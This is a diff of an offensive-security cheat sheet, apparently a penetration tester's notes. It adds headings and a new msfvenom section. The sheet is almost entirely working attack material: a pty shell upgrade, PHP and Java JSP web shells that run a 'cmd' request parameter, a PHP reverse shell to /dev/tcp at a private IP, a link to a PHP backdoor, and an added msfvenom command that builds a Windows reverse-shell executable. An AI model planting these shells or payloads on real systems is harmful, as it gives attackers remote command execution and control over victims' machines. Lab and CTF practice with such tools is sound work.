@@ -1,8 +1,8 @@
-INTERACTIVE SHELL
+#INTERACTIVE SHELL
 1) python -c 'import pty; pty.spawn("/bin/bash")' 
 2) echo os.system('/bin/bash')
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-WEB PHP
+-------------------------------------------------------------------------------------------------------------------------------------------------------------
+#WEB PHP
 1) <?php echo shell_exec( > $_GET['cmd']);?>
 2) <?php system($_GET['cmd']); ?>
 
@@ -11,8 +11,8 @@ WEB PHP REVERSE SHELL => <?php echo shell_exec('bash -i >& /dev/tcp/10.11.0.106/
 Another useful PHP methods: system, shell_exec, passthru = <?php passthru($_GET['cmd']);?>, backtrick operator ``, popen, exec, pcntl_exec, proc_open
 
 PHP BACKDOOR: https://github.com/b374k/b374k
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-JAVA WEB SHELL
+-------------------------------------------------------------------------------------------------------------------------------------------------------------
+#JAVA WEB SHELL
 
 <% if (request.getParameter("cmd") != null) {
 out.println("Output: " + request.getParameter("cmd") + "<br />");
@@ -24,4 +24,6 @@ String disr = dis.readLine();
 while ( disr != null ) {
 out.println(disr); disr = dis.readLine();
 } } %>
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------------------------------------
+#MSFVENOM PAYLOADS (WINDOWS)
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=[attacker ip] LPORT=53 -f exe -o reverse.exe
